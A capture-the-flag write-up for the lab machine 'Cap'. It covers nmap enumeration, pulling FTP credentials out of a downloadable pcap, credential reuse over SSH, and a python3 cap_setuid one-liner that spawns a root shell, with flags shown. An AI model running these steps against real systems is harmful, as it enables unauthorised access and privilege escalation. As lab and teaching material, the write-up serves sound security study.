# [Cap]()
Linux, 20 Points, Easy

ip=10.10.10.245

## User solution
The first thing is to do the nmap scan.
```console
┌──(kali㉿kali)-[~/HTB/Cap]
└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 11:08 EDT
Nmap scan report for 10.10.10.245
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sat, 26 Jun 2021 15:08:48 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 26 Jun 2021 15:08:41 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 26 Jun 2021 15:08:41 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=6/26%Time=60D742F4%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2555,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Sat,\x2026\x20Jun\x202021\x2015:08:41\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">\
SF:n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x2
SF:0<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\
SF:x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta\
SF:x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=
SF:1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"image
SF:/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20<
SF:link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\">
SF:\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/fon
SF:t-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel=
SF:\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.
SF:css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/c
SF:ss/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOption
SF:s,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat,\x2
SF:026\x20Jun\x202021\x2015:08:41\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x
SF:20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\
SF:n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP
SF:/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,189
SF:,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20S
SF:at,\x2026\x20Jun\x202021\x2015:08:48\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>
SF:\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.54 seconds
```

About the website serving on port 80.
The website is about security details related to the server. The Dashboard shows line graph no. of Security events, failed logins and UDP scans. A user named Nathan is logged in and the 'log-out' button doesn't seems to work.

There are other 3 pages for '5 sec PCAP analysis', 'ipconfig' and 'network status'.

PCAP page(`http://10.10.10.245/data/27`) shows about the no of packets and there is also a option to download the pcap

ipconfig page shows the output of running `ipconfig` in that server
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.245  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:ada2  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:ada2  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:ad:a2  txqueuelen 1000  (Ethernet)
        RX packets 1481197  bytes 182397986 (182.3 MB)
        RX errors 0  dropped 571  overruns 0  frame 0
        TX packets 1429580  bytes 350219656 (350.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 64730  bytes 4985798 (4.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 64730  bytes 4985798 (4.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Network status shows the output of running `netstat` in that server

On the PCAP page url we are also passing a number may be it is the index as each index stores pcap of 5 seconds. Using Burp Intruder I checked how many indexes are there and what are the no of packets in each of them. There were 32 indexes.
I rebooted the machine and checked again. Now there are ony 2 indexes. The 0 index have the same details as before. I downloaded the pcap and looked for anything useful.

In the file I got a user and password for FTP.
```
USER: Nathan
PASS: Buck3tH4TF0RM3!
```

```console
┌──(kali㉿kali)-[~/HTB/Cap]
└─$ ftp  10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 1001     1001        46631 Jul 07  2020 LinEnum.sh
-rwxr-xr-x    1 1001     1001          887 Mar 10 14:03 enum.sh
-rwxr-xr-x    1 1001     1001        84889 Jul 07  2020 les.sh
-rw-rw-r--    1 1001     1001          415 Jul 17 10:29 les.txt
-rw-rw-r--    1 1001     1001       102798 Jul 17 10:28 linEnum.txt
-rw-rw-r--    1 1001     1001       105395 Jul 17 10:28 linpeas.txt
-rwxr-xr-x    1 1001     1001       325865 Mar 10 13:58 linpeasnew.sh
-rwxr-xr-x    1 1001     1001        37195 Jul 07  2020 linuxprivchecker.py
-rw-rw-r--    1 1001     1001        10240 Jul 17 10:30 lpc.tar
-rw-rw-r--    1 1001     1001            0 Jul 17 10:30 lpc.txt
-rwxr-xr-x    1 1001     1001        37909 Jul 07  2020 lse.sh
-rw-rw-r--    1 1001     1001       136262 Jul 17 10:29 lse.txt
-rwxrwxr-x    1 1001     1001        46632 Jul 18 13:34 mm.sh
-rw-rw-r--    1 1001     1001       358400 Jul 17 10:30 privesc.tar
drwxr-xr-x    3 1001     1001         4096 Jul 17 10:27 snap
-rwsrwxrwx    1 1001     1001           10 Jul 17 11:08 test.sh
-r--------    1 1001     1001           33 Jul 17 10:01 user.txt
226 Directory send OK.
ftp> cat user.txt
?Invalid command
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (287.7372 kB/s)
ftp> exit
221 Goodbye.

┌──(kali㉿kali)-[~/HTB/Cap]
└─$ cat user.txt
fa4fb308e7486ab7ece2b4f2843c7480
```
## Root solution
The same credentials are also used for ssh.

After logging in through ssh I checked for SUID executables.
```console
nathan@cap:/$ find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/snapd/11841/usr/lib/snapd/snap-confine
/snap/snapd/8542/usr/lib/snapd/snap-confine
/snap/core18/2066/bin/mount
/snap/core18/2066/bin/ping
/snap/core18/2066/bin/su
/snap/core18/2066/bin/umount
/snap/core18/2066/usr/bin/chfn
/snap/core18/2066/usr/bin/chsh
/snap/core18/2066/usr/bin/gpasswd
/snap/core18/2066/usr/bin/newgrp
/snap/core18/2066/usr/bin/passwd
/snap/core18/2066/usr/bin/sudo
/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2066/usr/lib/openssh/ssh-keysign
/snap/core18/1997/bin/mount
/snap/core18/1997/bin/ping
/snap/core18/1997/bin/su
/snap/core18/1997/bin/umount
/snap/core18/1997/usr/bin/chfn
/snap/core18/1997/usr/bin/chsh
/snap/core18/1997/usr/bin/gpasswd
/snap/core18/1997/usr/bin/newgrp
/snap/core18/1997/usr/bin/passwd
/snap/core18/1997/usr/bin/sudo
/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1997/usr/lib/openssh/ssh-keysign
```
Got nothing interesting from the list. I started looking for any hints in the forum. There was one hint, 'the machine name is a big hint for all'. I searched for 'Cap linux' and got that cap means capabilities in Linux. Then I searched for 'capabilities linux priv esc'. From this article [Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) I got the solution for my next steps.
```console
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
cap_setuid enabled for python3. Use this to get root shell.
```
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# pwd
/home/nathan
root@cap:~# cat /root/root.txt
97d73be5289b560b9ad38430ff79b0c3
root@cap:~#
```
